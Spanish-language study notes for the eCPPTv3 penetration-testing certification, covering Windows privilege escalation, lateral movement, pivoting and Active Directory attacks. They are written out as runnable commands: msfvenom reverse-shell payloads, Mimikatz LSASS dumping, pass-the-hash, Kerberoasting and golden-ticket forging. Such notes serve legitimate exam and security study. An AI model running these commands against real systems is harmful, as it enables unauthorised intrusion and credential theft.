---
title: "üìù eCPPTv3 - Apuntes"
categories: [Certificaciones]
tags: [ecppt]
image: /assets/img/ecppt.svg
description: "Resumen y apuntes para preparar la eCPPTv3."
---

# üìù **eCPPTv3 - Apuntes**

Apuntes para la eLearnSecurity Certified Professional Penetration Tester (eCPPT) v3

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/img/ecppt.svg" width="250"/>
  <p style="font-style: italic; margin-top: 8px;">eCPPT - ¬© eLearnSecurity | INE</p>
</div>

# **PowerShell for pentesters**

## **‚öôÔ∏è Cmdlets**

En powershell, hay dos tipos de scripts, los que creamos nosotros (extensi√≥n .ps1) o los cmdlets que son b√°sicamente comandos nativos que trae la propia PowerShell. Existen diferentes tipos de par√°metros a la hora de lanzar una PowerShell:

- **ExecutionPolicy**: Determina qu√© scripts se pueden correr. Se desactiva con Bypass o Unrestricted.

```
powershell.exe -ExecutionPolicy Bypass .\script.ps1
powershell.exe -ExecutionPolicy Unrestricted .\script.ps1
```

- **WindowStyle**: Oculta la terminal de ps cuando se ejecuta:

    - Normal
    - Minimized
    - Maximized
    - Hidden

```
powershell.exe -WindowStyle Hidden .\script.ps1
```

- **Command**: El comando que hay que ejecutar:

```
powershell.exe -Command "& { Get-EventLog -LogName security }"
powershell.exe -Command "Get-EventLog -LogName security"
powershell.exe -Command Get-Process
```

Se ponen comillas si el comando a ejecutar es m√°s de uno.

- **EncodedCommand**: Permite pasar el comando en base 64.

```
$cmd = 'Get-Process'
$bytes = [Text.Encoding]::Unicode.GetBytes($cmd)
$b64 = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $b64
```

- **NoProfile**: Ejecuta el comando sin cargar ning√∫n perfil de usuario.

```
powershell.exe -NoProfile -Command Get-Process
```

Y despu√©s hay muchos otros cmdlets: Get-Help, Get-Command, Get-Process, Sort-Object, Select-Object, etc. Los comandos en ps, devuelven siempre objetos, por lo que estaremos trabajando con atributos, m√©todos, etc.

## **üì¶ M√≥dulos**

Un m√≥dulo en ps, es b√°sicamente un fichero terminado en .psm1 donde se agrupan funcionalidades. Puede ser por ejemplo un conjunto de cmdlets, archivos .ps1 con ficheros de configuraci√≥n por ejemplo.

- **Get-Module**: Lista todos los m√≥dulos importados.
    - **Get-Module -ListAvailable**: Lista todos los disponibles.

- **Import-Module .\module.psm1**: Importa un m√≥dulo
- **$env:PSModulePath**: Es una variable de entorno que contiene las rutas donde PowerShell busca m√≥dulos

# **Windows Privilege Escalation**

Para la mayor√≠a de las escaladas de privilegios que haremos en Windows, vamos a usar el framework o conjunto de herramientas, payloads y m√≥dulo de PowerSploit. Centr√°ndonos principalmente en la herramienta de PowerUp.ps1. Siempre que corramos este comando, tenemos que hacer lo siguiente.

```
powershell.exe -ExecutionPolicy bypass
. .\PowerUp.ps1
Invoke-PrivescAudit
```

## **üîë Locally stored credentials**

Para este tipo de escalada de privilegios, nos vamos a centrar en buscar y utilizar credenciales que est√©n almacenadas directamente en el equipo.

Corriendo el script **PowerUp.ps1**, generalmente ya podremos encontrar las credenciales que se est√°n almacenando en el equipo de forma autom√°tica. No obstante es interesante saber un poco donde se pueden llegar a encontrar esas credenciales principalmente.

- En los registros de Windows. (Por simplicidad no los buscaremos a mano)
- Unattended Installation Files. (Si se ha usado la instalaci√≥n autom√°tica de windows)
    - C:\Windows\Panther\Unattend.xml
    - C:\Windows\Panther\Autounattend.xml
- Windows Credential Manager.
- Powershell History.
    - C:\Users\USERS\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history

En el caso de que las encontremos en **Unattend.xml** o **Autounattend.xml**, si la opci√≥n de PlainText est√° en FALSE, significa que est√° en base64.

Para el caso de **Windows Credential Manager**, tenemos que hacer uso de su programa para poder acceder a ellas.

```
powershell -ExecutionPolicy bypass
cmdkey /list
runas.exe /savecred /user:administrator cmd
runas.exe /user:DOMINIO\bobby cmd
```

Cuando hacemos **cmdkey /list** solo se nos dice si hay o no credenciales y para que usuario, pero no nos las muestra. Esto no es un problema ya que con **runas.exe** y el par√°metro **/savecred**, ya se hace uso de ellas directamente.

Cabe destacar que siempre que encontremos una credencial, para movernos a ese usuario, podemos hacer a trav√©s de herramientas como impacket o metasploit desde nuestra m√°quina atacante, pero tambi√©n podemos hacer uso de ``runas.exe /user:USER EXECUTABLE``. Runas.exe simplemente va a ejecutar el .exe que le digas c√≥mo el usuario que le pases. Podemos jugar con esto para que en vez de lanzar un CMD, nos lance una shell de meterpreter con el usuario elegido.

## **üîß Services exploits**

Los servicios en Windows son programas que se ejecutan en segundo plano, normalmente desde el arranque, sin necesidad de que un usuario inicie sesi√≥n, y suelen encargarse de funciones cr√≠ticas del sistema o de aplicaciones (red, impresi√≥n, actualizaciones, etc.). Si estos servicios est√°n mal configurados, un usuario con pocos privilegios puede modificarlos o abusar de ellos para conseguir permisos superiores.

Para poder identificar estos servicios vulnerables, podemos hacer uso de la herramienta **PowerUp.ps1**.

Gracias a esta herramienta, podemos ver si tenemos ciertos permisos de escritura en directorios donde se encuentran los ejecutables de los servicios. En caso de ser as√≠, nosotros podemos cambiar ese ejecutable por uno que nos interese para ganar privilegios.

La forma m√°s interesante de hacer esto es la siguiente:

- Subir archivo.exe.
- Reemplazar el ejecutable real por el nuestro y reiniciar el servicio.

Generalmente es recomendable que el archivo.exe sea un reverse shell de meterpreter y que r√°pidamente despu√©s de obtenerla, migremos a un proceso con privilegios de administrador para no perder el proceso. Es muy probable que al iniciar el servicio algo falle y el proceso muera ya que el ejecutable no es el esperado. Lo m√°s recomendable y com√∫n es migrar el proceso lsass.exe **(migrate -N lsass.exe)**

## **üìù Registry Autoruns**

Los registros en Windows, es una base de datos donde el sistema y las aplicaciones guardan configuraciones (rutas de programas, servicios, drivers, etc ‚Ä¶). Dentro de estos registros est√°n las claves **autorun** y **startup**. Las rutas m√°s importantes suelen ser:

- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
- HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
- HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services

La primera de ellas se encarga de qu√© programas ejecutar cuando la m√°quina se arranca. Esto lo puede hacer funcionar cualquier usuario. Es decir, cuando un usuario inicia sesi√≥n en un equipo se van a ejecutar los registros especificados bajo esa ruta, incluido el administrador. Por lo que si nosotros tenemos privilegios de escritura en estos registros, podemos colar un archivo.exe malicioso para ganar por ejemplo una sesi√≥n de meterpreter.

Podemos comprobar los privilegios con este comando:

```
Get-Acl "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" | Format-List
```

En el caso de que tengamos permisos completos, el procedimiento es igual que otras veces para ganar una sesi√≥n de meterpreter.

## **üé≠ Access Token Impersonation**

Un access token es un objeto que describe qui√©n eres (usuario, grupos, privilegios) y qu√© puedes hacer en el sistema, y la ‚Äúimpersonation‚Äù consiste en que un proceso o hilo act√∫a temporalmente usando el token de otro usuario para acceder a recursos como si fuera ese usuario. Esto en principio tiene sentido por ejemplo para que un determinado proceso corra con unos determinados privilegios en funci√≥n del usuario que lo ejecute. No obstante, si somos capaces de obtener algunos de estos tokens, podemos hacernos pasar por otro usuario. Todos estos tokens son manejados por el lsass.exe.

Para llevar a cabo esta escalada de privilegios, vamos a hacer uso del m√≥dulo **incognito** de **metasploit**. Por ellos vamos a partir de que tenemos una sesi√≥n de meterpreter ya activa. Adem√°s es necesario se√±alar que para que esto funcione nuestro usuario tiene que contar con los permisos (**SeImpersonatePrivilege**).

- load_incognito
- list_tokens -u
- impersonate_token ‚ÄúTOKEN COPIADO‚Äù

## **ü•î Juicy Potato**

Juicy Potato es una herramienta que aprovecha c√≥mo funcionan los COM/DCOM y ciertos CLSID especiales para escalar privilegios.

- COM: (Component Object Model) es una forma que tiene Windows de ofrecer ‚Äúobjetos‚Äù reutilizables (componentes) que los programas pueden usar, incluso si est√°n escritos en lenguajes distintos.
- DCOM: (Distributed COM) es la versi√≥n ‚Äúdistribuida‚Äù: permite que esos objetos COM se usen a trav√©s de red o entre procesos diferentes, usando RPC por debajo para comunicarse.
- CLSID: (Class ID) es un identificador √∫nico que representa una clase COM concreta.

La forma en la que vamos a usar esto para escalar privilegios es la siguiente:

- Necesitamos el permiso SeImpersonatePrivilege.
- Necesitamos un CLSID de un servidor COM privilegiado.
    - 4991d34b-80a1-4291-83b6-3328366b90974991d34b-80a1-4291-83b6-3328366b9097
    - [http://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard/](http://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard/)
- Subimos un archivo.exe malicioso.
- Ejecutamos JuicyPotato.exe.

```
C:\Users\Public\JuicyPotato.exe -l 4444 -p C:\Users\Public\backdoor.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
```

Ahora vamos a explicar que pasa realmente por detr√°s:

- El sistema COM/DCOM recibe la petici√≥n de ‚Äúcrear objeto con este CLSID‚Äù
- Ve en el registro que ese CLSID se implementa en un servidor COM que corre como SYSTEM
- Arranca o reutiliza ese proceso y establece una comunicaci√≥n RPC/DCOM entre √©l (SERVER, SYSTEM) y nosotros.
- El servidor COM, al atender la petici√≥n, se comunica con tu proceso usando sus propias credenciales (SYSTEM).
- Esas credenciales est√°n en memor√≠a, pero a trav√©s de APIs JuicyPotato las obtiene y las impersona.

## **üõ°Ô∏è Elucir UAC**

‚ÄúUser Access Control‚Äù (UAC) es el pop up que aparece en Windows cuando instalas algo que va a realizar cambios en el sistema operativo y te pide que confirmes. Cabe destacar que esto aparece cuando un usuario puede realizar cambios en el sistema operativo y, para que esto suceda, el usuario tiene que formar parte del grupo de administradores del sistema. Esto se puede comprobar haciendo uso del comando **``net localgroup administrators``** dentro del cmd

Para intentar evadir este pop-up, haremos uso de la herramienta externa UACme. Esta la podemos descargar de [GitHub](https://github.com/hfiref0x/UACME)

Una vez clonado el repositorio, el ejecutable que nos interesa es Akagi64.exe. Para evadir de forma exitosa el UAC, lo que tenemos que hacer es correr ese ejecutable con el par√°metro 23 y el archivo.exe que queremos que se ejecute con privilegios de administrador, de la siguiente manera: **``.\Akagi64.exe 23 shell.exe``**. Una vez m√°s, el proceso de generaci√≥n de est√° shell se puede encontrar aqu√≠.

## **üìö DLL Hijacking**

Un DLL (Dynamic Link Library) es un tipo de archivo que contiene c√≥digo y datos que muchos programas pueden reutilizar, en lugar de que cada programa tenga que traer ese c√≥digo ‚Äúcopiado dentro‚Äù. Adem√°s, al igual que un ejecutable normal, este DLL tambi√©n se ejecuta con los privilegios del usuario que lo invoca, lo que lo hace un vector potencialmente vulnerable. La idea de este ataque es ver si podemos inyectar un DLL malicioso en alguna ruta en la que tengamos permisos de escritura. Para buscar estas rutas, podemos hacer uso de la herramienta Process Monitor y filtrar por aquellos DLL que no han sido encontrados. Una vez que tenemos el nombre de un DLL que no ha sido encontrado, vamos a esa ruta y ponemos nuestro payload malicioso

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o NOMBRE.dll
```

# **Windows Lateral Movement**

El movimiento lateral es la fase en la que, despu√©s de comprometer una m√°quina dentro de una red, empezamos a movernos desde ese primer equipo hacia otros usando credenciales que hemos obtenido (usuarios, contrase√±as o hashes). En esta fase usamos servicios leg√≠timos como SMB, RDP o WinRM para encadenar saltos y llegar a sistemas m√°s sensibles o a cuentas con m√°s privilegios.

## **üíª SMB (PsExec & SMBExec)**

Las dos herramientas usan SMB sobre TCP (puerto 445) para autenticarse con NTLM, acceder a comparticiones administrativas como ADMIN$ y C$, y transferir archivos relacionados con la ejecuci√≥n remota. Adem√°s, en ambos casos se apoyan en el servicio de administraci√≥n remota de servicios de Windows (RPC/SCM) para crear y arrancar servicios que ejecutan los comandos en el host remoto.

Para que las credenciales de un usuario sirvan, necesitamos permisos de administrador local en el destino

```
psexec.py 'dominio/usuario:Password@10.10.10.10' cmd.exe
psexec.py 'usuario:Password@10.10.10.10' cmd.exe
psexec.py -hashes LMHASH:NTHASH 'dominio/usuario@10.10.10.10' cmd.exe
----------------------------------------------------------------------------
smbexec.py 'dominio/usuario:Password'@10.10.10.10
smbexec.py 'usuario:Password'@10.10.10.10

smbexec.py -hashes :NTHASH 'domino/usuario@10.10.10.10'
smbexec.py -hashes :NTHASH 'usuario@10.10.10.10'
	
	-shell-type powershell // Para indicar el tipo de shell
```

Es generalmente √∫til antes de intentar ganar acceso remoto a la m√°quina comprobar que las credenciales obtenidas son v√°lidas. Para ello podemos hacer uso de CrackMapExec/NetExec.

```bash
nxc smb 10.10.10.10 -u usuario -p 'Password'
nxc smb 10.10.10.10 -u usuario -H 'LMHASH:NTHASH'
nxc smb 10.10.10.10 -u usuario -H 'NTHASH'

	--sam //dumpea la sam
	--lsa //dumpea los lsa secrets
	-x    // ejecuta un comando en el servidor
```

Es muy recomendable una vez que tengamos una terminal a trav√©s de SMB, pasarla a metasploit por ejemplo a trav√©s de HTA.

## **‚ö°WINRM (evil-winrm)**

WinRM (Windows Remote Management) es la implementaci√≥n de Microsoft del est√°ndar WS‚ÄëManagement, que permite administrar equipos Windows de forma remota, normalmente sobre HTTP/HTTPS en los puertos 5985 (HTTP) y 5986 (HTTPS).

```bash
evil-winrm -i 10.10.10.10 -u 'usuario' -p 'Password'
evil-winrm -i 10.10.10.10 -u 'usuario' -H 'LMHASH:NTHASH'
evil-winrm -i 10.10.10.10 -u 'usuario' -H ':NTHASH'
```

Una vez m√°s es interesante comprobar si las credenciales son b√°sicas con CrackMapExec/NetExec.

```bash
nxc winrm 10.10.10.10 -u usuario -p 'Password'
nxc winrm 10.10.10.10 -u usuario -H 'LMHASH:NTHASH'
nxc winrm 10.10.10.10 -u usuario -H 'NTHASH'
```

## **üñ•Ô∏è RDP (xfreerdp)**

RDP es un protocolo gr√°fico que permite iniciar sesi√≥n de forma interactiva en un equipo remoto por TCP, normalmente en el puerto 3389.

Por defecto, solo los miembros del grupo local ‚ÄúAdministradores‚Äù pueden conectarse por RDP a un equipo Windows, aunque tambi√©n se pueden autorizar otros usuarios a√±adiendolos al grupo ‚ÄúUsuarios de escritorio remoto‚Äù

Para Pass‚Äëthe‚ÄëHash con RDP, el servidor debe tener habilitado el ‚ÄúRestricted Admin Mode‚Äù, controlado por una clave de registro en HKLM\System\CurrentControlSet\Control\Lsa que determina si acepta este tipo de sesiones. Sin esa configuraci√≥n, el hash NTLM te servir√° igualmente para otros servicios (SMB, PsExec, WinRM), pero no directamente para establecer una sesi√≥n RDP tipo PTH.

```bash
xfreerdp /u:usuario /pth:NTHASH /v:10.10.10.10
xfreerdp /u:usuario /p:Password /v:10.10.10.10
xfreerdp /u:DOMINIO\\usuario /p:Password /v:10.10.10.10
```

## **üîå WMIExec (wmiexec)**

WMIExec es una herramienta incluida en el conjunto Impacket que permite ejecutar comandos de forma remota en sistemas Windows mediante el protocolo Windows Management Instrumentation (WMI). A diferencia de herramientas como PsExec que crean servicios temporales en el sistema objetivo, WMIExec utiliza la infraestructura WMI ya presente en Windows, haci√©ndola m√°s sigilosa y dif√≠cil de detectar

WMIExec aprovecha el servicio WMI nativo de Windows que corre constantemente en el sistema operativo. Cuando ejecutas la herramienta, primero se conecta al puerto TCP 135 (RPC Endpoint Mapper) del sistema objetivo para negociar la conexi√≥n con el servicio WMI. Despu√©s de esta negociaci√≥n inicial, la comunicaci√≥n real se redirige autom√°ticamente a un puerto din√°mico de alto rango (t√≠picamente entre 49152-65535) asignado por Windows. Una vez establecida la conexi√≥n, WMIExec env√≠a instrucciones mediante llamadas WMI que el proceso WmiPrvSE.exe ejecuta en el sistema remoto, captura la salida de los comandos y la devuelve al atacante sin necesidad de escribir archivos en disco.

Para todo esto podemos usar el siguiente programa de impacket:

```bash
impacket-wmiexec WORKGROUP/User:Password@10.10.10.10
impacket-wmiexec -hashes NTLM WORKGROUP/User@192.168.1.10
```

# **Pivoting**

Cabe destacar que cuando hacemos el pivoting tanto con SSH como con un SOCKS proxy, podemos comprobar que el pivoting est√° funcionando correctamente haciendo uso del comando:  **``netstat -tpln``**.

## **üéØ Pivoting y portforwarding con Metasploit**

Lo que vamos a hacer aqu√≠ es fijar un puerto de nuestro localhost que se comunique directamente con un puerto de otra m√°quina a la que no tenemos acceso haciendo uso de una m√°quina intermedia.

Una vez que tenemos una sesi√≥n de meterpreter de la m√°quina 1, podemos correr los siguientes comandos:

```bash
run auttoroute -s IP_MAQUINA_1/20
portfwd add -l LOCAL_PORT -p MAQUINA_2_PORT -r IP_MAQUINA_2
	portfwd list // para ver los puertos
```

A partir de aqu√≠, cada vez que usemos alguna herramienta como nmap para escanear el puerto de la m√°quina 2, tendremos que hacer referencia al puerto que hayamos puesto para nuestra m√°quina y al localhost.

## **üß¶ Pivoting con Metasploit y SOCKS Proxy**

Otra opci√≥n es configurar un socks proxy para en vez de vincular un puerto de la m√°quina 2 con uno de nuestra m√°quina, usar la m√°quina 1 para redirigir todo nuestro tr√°fico a la m√°quina 2. Para ello vamos a hacer uso de Metasploit con SOCKS proxy y proxychains.

Una vez que tengamos una sesi√≥n de meterpreter, vamos a realizar lo siguiente:

```bash
use multi/manage/autoroute
	set SUBRED SUBNET_MAQUINA_1
	set SESSION

use auxiliary/server/socks_proxy
	set VERSION 4a
	set SRVPORT 9050
```

A partir de ahora cada vez que queramos tener conectividad con la m√°quina 2, tendremos que poner el comando proxychains al principio del todo, como por ejemplo: **proxychains namp 192.192.254.3**.

Cabe destacar como cosa muy importante, que cuando usamos un SOCKS proxy **NO** podemos realizar ni **PING** ni escaneos que no sean **TCP**. Es decir, tenemos que correr NMAP como en el ejemplo anterior, con las flags -sT y -Pn.

## **üîê Pivoting con SSH**

Tambi√©n, podemos hacer uso de ssh para enrutar nuestro tr√°fico y conseguir conectividad con la m√°quina 2 haciendo uso de la m√°quina 1. La √∫nica diferencia con respecto al anterior m√©todo, es que el tr√°fico va a ir siempre cifrado de extremo a extremo. Los comandos para realizar Pivoting con SSH son los siguientes.

```bash
ssh root@10.10.10.10 -D 9050
```

Y a partir de aqu√≠, la teor√≠a es la misma que arriba. No se pueden hacer ni PING ni escaneos -sS, tienen que ser -sT.

# **Active Directory (AD)**

Los **usuarios**, son la identidad digital de una persona. Los usuarios pueden ser personas est√°ndar, administradores o cuentas de servicio. Estos √∫ltimos, son usuarios ‚Äòinvisibles‚Äô que usan las cuentas para funcionar como por ejemplo svc_winrm. Los **equipos** o computers accounts son b√°sicamente cuentas pero que est√°n enlazadas a equipos. Es decir, para AD un port√°til es un usuario m√°s que necesita permisos. Los **grupos**, se usan para asignar de forma conjunta una serie de privilegios a unos usuarios o equipos.

## **üìÇ Organizational Units (OUs)**

Las OU, son una especie de carpetas en AD donde se meten usuarios, grupos, equipos e incluso otras OUs para poder organizarlos y gestionarlos todos en bloque. Las OUs se suelen usar principalmente para dos cosas. La primera es aplicar pol√≠ticas (GPOs), ya que si vinculas una GPO a un OU, esta organizaci√≥n se aplica a los usuarios, equipos y grupos que haya dentro. El otro uso que se le puede dar es para delegar tareas administrativas. Por ejemplo si queremos a alguien que gestione contrase√±as, creaci√≥n de usuarios u otras cosas pero solo dentro de la OU.

## **üå≤ √Årboles, bosques y relaciones**

Para empezar hay que entender que un dominio es la unidad b√°sica de organizaci√≥n en AD, que tiene su propia base de datos (NTDS.dit), sus controladores de dominio (DCs) etc ‚Ä¶

Un √°rbol es un conjunto de uno o m√°s dominios que comparten un espacio de nombres DNS. Por ejemplo, dominio ra√≠z (empresa.com), subdominios (ventas.empresa.com, compras.empresa.com). Estos tres dominios formar√≠an un √°rbol porque cuelgan de empresa.com en el DNS. Cada dominio del √°rbol tiene su propio DC, KDC etc ‚Ä¶

De manera an√°loga, un bosque es un conjunto de √°rboles. Es decir, si tenemos por ejemplo empresa.com con 2 subdominios dentro y filial.com con otros 2 subdominios dentro, si ambos √°rboles est√°n enlazados, se considera un bosque.

Y las relaciones, permiten que usuarios de un dominio, √°rbol o bosque puedan autenticarse y acceder a recursos en otro dominio, √°rbol o bosque.

## **üîç Enumeraci√≥n en AD**

Antes de empezar a estudiar la enumeraci√≥n en AD, hay que explicar qu√© es LDAP, ya que es el protocolo que vamos a utilizar una vez que tengamos acceso a una cuenta para poder enumerar el AD.

LDAP (Lightweight Directory Access Protocol) es el protocolo est√°ndar que se usa para consultar y modificar servicios de directorio. Active Directory es una implementaci√≥n de directorio que usa LDAP (entre otros protocolos como Kerberos, DNS, SMB). Es decir, LDAP es el "lenguaje" que se usa para hacer consultas al AD. Estas consultas pueden ser para listar usuarios, grupos, equipos, OUs, SPNs, GPOs etc ‚Ä¶

### **üìä Enumeraci√≥n con PowerView**

#### **Usuarios**

```
Get-LocalUser  // Lista los usuarios solo del equipo
Get-DomainUser // Lista los usuarios del AD
	Get-DomainUser | select samaccountname, objectsid
```

#### **Grupos**

```
Get-LocalGroup // Lista los grupos solo del equipo
Get-LocalGroupMember Administrators // Lista los miembros que pertenecen a un grupo
Get-NetGroup // Lista los grupos del AD
	Get-NetGroup 'Domain Admins'
```

#### **Dominio**

```
Get-Domain                        // Enumera todo el dominio
Get-Domain -Domain SECURITY.local // Enumera un dominio en especifico
Get-DomainSID                     // Muestra el SID del Dominio
Get-DomainController              // Lista informaci√≥n acerca del DC
Get-DomainController -Domain SECURITY.local // Lista informaci√≥n del DC de un dominio en concreto
```

#### **Equipos**

```
Get-NetComputer // Lista los equipos del AD
Get-NetComputer -Domain SECURITY.local | select cn, operatingsystem
```

#### **Shares**

```
Find-DomainShare -ComputerName prod.research.SECURITY.local -verbose
Find-DomainShare -ComputerName prod.research.SECURITY.local -CheckShareAccess -verbose // Permisos de lectura
Get-NetShare // Shares en el localhost
```

#### **GPOs y OUs**

```
Get-NetGPO // Lista las GPOs del AD
Get-NetOU  // Lista las OUs del AD
```

#### **Relaciones y Bosques**

```
Get-NetDomainTrust
Get-NetForest
Get-NetForestTrust
Get-NetForest -Forest tech.local
Get-NetForestDomain
Get-NetForestDomain -Forest tech.local
```

#### **Cuentas Kerberoasteable y AS-REP roastables**

```
Get-NetUser -SPN | select samaccountname, serviceprincipalname // Kerberos
Get-NetUser -PreauthNotRequired | select samaccountname, useraccountcontrol // AS-REP
```

## **üí¶ Password Spraying**

Password spraying es una t√©cnica de ataque que consiste en probar una o pocas contrase√±as probables contra muchas cuentas, intentando evitar bloqueos por intentos fallidos (lockout) y pasar desapercibido.

```
. .\PowerView.ps1
Get-DomainUser | Select-Object cn | Out-File users.txt // Usuarios

. .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -UserList users.txt -PasswordList pass -Verbose
```

## **üî• AS-REP Roasting**

AS-REP Roasting es una t√©cnica de ataque contra Active Directory que aprovecha cuentas que tienen deshabilitada la pre autenticaci√≥n Kerberos para obtener hashes que luego se pueden intentar crackear offline. El flujo de autenticaci√≥n de Kerberos es el siguiente:

- El cliente solicita un TGT (Ticket Granting Ticket) al KDC (Key Distribution Center, que est√° en el DC).
- Antes de emitir el TGT, el KDC pide al cliente que demuestre conocer la contrase√±a del usuario (esto es la "pre autenticaci√≥n"): el cliente env√≠a un timestamp cifrado con la clave derivada de su contrase√±a.
- Si el DC puede descifrar ese timestamp, confirma que el usuario sabe la contrase√±a y le devuelve el TGT cifrado con la clave del usuario.

Si la pre autenticaci√≥n est√° desactivada, nosotros podemos pedir directamente este TGT sin tener que demostrar que somos nosotros el usuario, y despu√©s podemos crackearlo de forma offline para obtener la contrase√±a del usuario. A continuaci√≥n, vamos a explicar c√≥mo se hace este ataque en la pr√°ctica.

```
. .\PowerView.ps1

Get-DomainUser | Where-Object {$_.UserAccountControl -like "*DONT_REQ_PREAUTH*"} | Select-Object cn

.\Rubeus.exe asreproast /user:USER /outfile:hash.txt
```

## **üé´ Kerberoasting**

Kerberoasting es una t√©cnica de ataque contra Active Directory que explota cuentas de servicio con SPNs registrados para obtener tickets Kerberos cifrados que luego se pueden crackear offline. Un SPN es un identificador √∫nico asociado a una cuenta (usuario o cuenta de equipo) que indica que esa cuenta ejecuta un servicio de red espec√≠fico.

Cuando un usuario quiere acceder a un servicio en la red (por ejemplo, conectarse a una base de datos SQL), su m√°quina necesita obtener un ticket de servicio (TGS - Ticket Granting Service) del DC. Ese ticket est√° cifrado con la clave (derivada de la contrase√±a) de la cuenta que tiene registrado el SPN del servicio.

Kerberos usa el SPN para saber "a qu√© cuenta le pido el ticket" y cifra el TGS con la clave de esa cuenta, de forma que solo esa cuenta (el servicio real) pueda descifrarlo y validar al usuario.

Este vector de ataque, se ejecuta de la siguiente manera:

- Solicitud de TGS: el atacante solicita al DC un TGS para cada SPN encontrado. Como tiene credenciales v√°lidas de dominio, el DC le entrega el ticket sin problema.
- Extracci√≥n del hash: el TGS contiene una parte cifrada con la clave de la cuenta del servicio (derivada de su contrase√±a). El atacante extrae esa porci√≥n cifrada.
- Crackeo offline: el atacante usa herramientas de cracking (Hashcat, John the Ripper) para intentar descifrar el hash y obtener la contrase√±a en texto claro de la cuenta de servicio.

Hay dos maneras de realizar Kerberoasting desde un equipo windows:

### 1Ô∏è‚É£ **Opci√≥n 1**

```
. .\PowerView.ps1
Get-NetUser | Where-Object {$_.servicePrincipalName} | Select-Object samaccountname, servicePrincipalName
Invoke-Kerberoast | Select-Object hash > hash.txt
```

### 2Ô∏è‚É£ **Opci√≥n 2**

```
setspn -T research -Q */* | Where-Object { $_ -like "*:*" -and $_ -notlike "*CN=*" } | ForEach-Object { $_.Trim() }

Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SERVICE"

klist | Select-String "Server:" | ForEach-Object { ($_ -split 'Server:\s+')[1].Split('@')[0].Trim() }

// Sacamos de memoria
	1. .\Rubeus.exe kerberoast /outfile:hashes.txt
	2. Invoke-Mimikatz -command '"kerberos::list /export"'
```

## **üîë Pass The Hash (Pth)**

Al igual que en un entorno de Windows sin AD, el ataque de pass the hash se efect√∫a de la siguiente manera. Con herramientas como mimikatz, obtenemos hashes NTLM de memoria para posteriormente autenticarnos como el usuario de ese hash.

Es √∫til recordar que para el uso de la herramienta mimikatz, hay que tener privilegios de administrador local sobre una cuenta para poder realizar el dumpeo.

```
. .\PowerView.ps1
Find-LocalAdminAccess // Para buscar esos privilegios de administrador local
Enter-PSSession HOST  // Para conectarnos a ese host

En el HOST
Invoke-Mimikatz -Command "privilege::debug" // Comprobar permisos
Invoke-Mimikatz -Command "sekurlsa::logonpasswords" // Dump LSASS

Invoke-Mimikatz -Command '"sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH /run:powershell.exe"'
```

## **üéüÔ∏è Pass The Ticket (Ptt)**

Es una t√©cnica que consiste en robar tickets Kerberos (TGT - Ticket Granting Ticket o TGS - Ticket Granting Service) de la memoria de un sistema comprometido y luego inyectarlos en otra sesi√≥n para autenticarse como el usuario due√±o del ticket, sin necesidad de conocer su contrase√±a ni su hash.

```
. .\PowerView.ps1
Find-LocalAdminAccess // Para buscar esos privilegios de administrador local
Enter-PSSession HOST  // Para conectarnos a ese host

En el HOST
Invoke-Mimikatz -Command "privilege::debug" // Comprobar permisos
ls *.kirbi // Vemos los tickets obtenidos
Invoke-Mimikatz -Command '"kerberos:ptt TICKET" // Inyectamos ticket

klist | Select-String "Server:" | ForEach-Object { ($_ -split 'Server:\s+')[1].Split('@')[0].Trim() } // Comprobamos el ticket

ls \\HOST\c$ // Ya tenemos acceso a un HOST
```

### **ü•à Silver Ticket**

### **ü•á Golden Ticket**

Un Golden Ticket es una t√©cnica de persistencia en Active Directory que consiste en forjar un TGT de Kerberos usando la clave de la cuenta KRBTGT del dominio, que es la cuenta que el KDC usa para firmar/cifrar los TGTs. Con ese TGT cargado en una sesi√≥n, se pueden solicitar TGS para servicios concretos (CIFS/SMB, HTTP, MSSQL, LDAP, etc.) como si fueras el usuario indicado en el ticket, usando el flujo Kerberos normal.

Para realizar este ataque, como ya hemos dicho antes, necesitamos el Hash NTLM de la cuenta KRBTGT. Este hash se puede obtener mediante el uso de mimikatz como hemos hecho en otras ocasiones. Un vector de ataque posible es el siguiente:

```
. .\Invoke-Mimikatz.ps1

// Queremos el NTLM de KRBTGT y el SID del admin (por convenio)
// Los podemos sacar con estos dos comandos (probar los dos)
1. Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

2. Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername prod.reserach.security.local // Secretos del DC. Necesitamos privilegios de administrador para acceder al DC

// Generamos el golden ticket y se lo asociamos al usuario Administrador por // convenio
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain: /sid:DOMAINSID /krbtgt:NTLM /id:500 /groups:512 /startoffset:0 /end:600 /renewmax:10080 /ptt"'
```

Cabe destacar, que en esta √∫ltima l√≠nea, lo que estamos haciendo es crear un Golden Ticket para el usuario Administrador, y este golden ticket es del TGS al cual corresponda el SID. Y por ello, este SID tiene que ser el del DC.

# **T√©cnicas extras**

## **üîÑ Pasar un Agente del C2 a Metasploit**

```bash
# Nos vamos a Metasploit:

use exploit/multi/script/web_delivery
set payload windows/meterpreter/reverse_tcp
set TARGET 2
set SRVHOST C2_IP
set LHOST MY_IP

# Nos vamos al C2

set Agent NAME
usemodule powershell/code_execution/invoke_metasploitpayload
set URL METASPLOIT_URL
execute
```

## **üîå Pasar una m√°quina a Metasploit para Port Forwarding**

```bash
# En Metasploit

use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST / set LPORT

# En terminal

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f psh -o script.ps1

# Lo subimos a la m√°quina y lo ejecutamos.
# En Metasploit

use post/multi/manage/autoroute
set SESSION NUM_SESSION
run
